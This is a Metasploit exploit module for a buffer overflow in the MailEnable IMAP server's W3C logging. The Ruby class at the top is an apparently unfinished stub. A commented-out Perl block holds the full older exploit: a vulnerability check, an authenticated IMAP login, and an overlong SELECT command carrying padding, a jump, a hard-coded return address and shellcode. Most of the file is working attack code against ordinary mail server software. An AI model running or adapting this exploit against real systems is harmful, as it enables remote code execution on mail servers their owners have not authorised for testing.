require 'msf/core'

module Msf

class Exploits::Windows::XXX_CHANGEME_XXX < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'MailEnable IMAPD W3C Logging Buffer Overflow',
			'Description'    => %q{
				This module exploits a buffer overflow in the W3C logging
				functionality of the MailEnable IMAPD service. Logging is
				not enabled by default and this exploit requires a valid
				username and password to exploit the flaw. MailEnable
				Professional version 1.6 and prior and MailEnable Enterprise
				version 1.1 and prior are affected.
					
			},
			'Author'         => [ 'y0 <y0@w00t-shell.net>' ],
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'BID', '15006'],

				],
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 600,
					'BadChars' => "\x00\x0a\x0d\x20",
					'Prepend'  => "\x81\xec\x96\x40\x00\x00\x66\x81\xe4\xf0\xff",

				},
			'Targets'        => 
				[
					[ 
						'Automatic Targetting',
						{
							'Platform' => 'win32, winnt, win2000, winxp, win2003',
							'Ret'      => 0x0,
						},
					],
				],
			'DisclosureDate' => '',
			'DefaultTarget' => 0))
	end

	def exploit
		connect
		
		handler
		disconnect
	end

=begin

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::mailenable_imap_w3c;
use strict;
use base 'Msf::Exploit';
use Msf::Socket::Tcp;
use Pex::Text;

my $advanced = {
  };

my $info = {
	'Name'    => 'MailEnable IMAPD W3C Logging Buffer Overflow',
	'Version'  => '$Revision$',
	'Authors' => [ 'y0 <y0 [at] w00t-shell.net>', ],
	'Arch'    => [ 'x86' ],
	'OS'      => [ 'win32', 'winnt', 'win2000', 'winxp', 'win2003'],
	'Priv'    => 1,
	'AutoOpts'  =>
	  {
		'EXITFUNC'  => 'thread',
	  },
	'UserOpts'  =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 143],
		'USER'  => [1, 'DATA', 'IMAP Username'],
		'PASS'  => [1, 'DATA', 'IMAP Password'],

	  },
	'Payload' =>
	  {
		'Prepend'   => "\x81\xec\x96\x40\x00\x00\x66\x81\xe4\xf0\xff",
		'Space'     => 600,
		'BadChars'  => "\x00\x0a\x0d\x20",
		'Keys'      => ['+ws2ord'],
	  },
	'Description'  => Pex::Text::Freeform(qq{
		This module exploits a buffer overflow in the W3C logging
	functionality of the MailEnable IMAPD service. Logging is not
	enabled by default and this exploit requires a valid username
	and password to exploit the flaw. MailEnable Professional version
	1.6 and prior and MailEnable Enterprise version 1.1 and prior are
	affected.    
}),
	'Refs'  =>
	  [
		['BID', 15006],
	  ],
	'Targets' =>
	  [
		['MailEnable 1.54 Pro Universal', 0x1001c019], #MEAISP.DLL
	  ],
	'Keys' => ['imap'],
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);

	return($self);
}

sub Check {
	my ($self) = @_;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');

	my $s = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => 25,
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	  );

	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return $self->CheckCode('Connect');
	}

	$s->Send("QUIT\r\n");
	my $res = $s->Recv(-1, 20);
	$s->Close();

	if ($res !~ /MailEnable Service, Version: 0-1\.54/) {
		$self->PrintLine("[*] This server does not appear to be vulnerable.");
		return $self->CheckCode('Safe');
	}

	$self->PrintLine("[*] Vulnerable installation detected :-)");
	return $self->CheckCode('Detected');
}

sub Exploit {
	my $self = shift;

	my $targetHost  = $self->GetVar('RHOST');
	my $targetPort  = $self->GetVar('RPORT');
	my $targetIndex = $self->GetVar('TARGET');
	my $user        = $self->GetVar('USER');
	my $pass        = $self->GetVar('PASS');
	my $encodedPayload = $self->GetVar('EncodedPayload');
	my $shellcode   = $encodedPayload->Payload;
	my $target = $self->Targets->[$targetIndex];

	my $sock = Msf::Socket::Tcp->new(
		'PeerAddr' => $targetHost,
		'PeerPort' => $targetPort,
	  );
	if($sock->IsError) {
		$self->PrintLine('Error creating socket: ' . $sock->GetError);
		return;
	}

	my $resp = $sock->Recv(-1);
	chomp($resp);
	$self->PrintLine('[*] Got Banner: ' . $resp);

	my $sploit = "a01 LOGIN $user $pass\r\n";
	$sock->Send($sploit);
	my $resp = $sock->Recv(-1);
	if($sock->IsError) {
		$self->PrintLine('Socket error: ' . $sock->GetError);
		return;
	}
	if($resp !~ /^a01 BAD LOGIN-/) {
		$self->PrintLine('Login error: ' . $resp);
		return;
	}
	$self->PrintLine('[*] Logged in, sending overflow');

	my $splat = Pex::Text::AlphaNumText(6196);
	$sploit =
	  "a01 SELECT ". $splat.
	  "\xeb\x06".  pack('V', $target->[1]).
	  $shellcode. "\r\n";

	$sock->Send($sploit);

	my $resp = $sock->Recv(-1);
	if(length($resp)) {
		$self->PrintLine('[*] Got response, bad: ' . $resp);
	}

	return;

}

1;

=end


end
end	
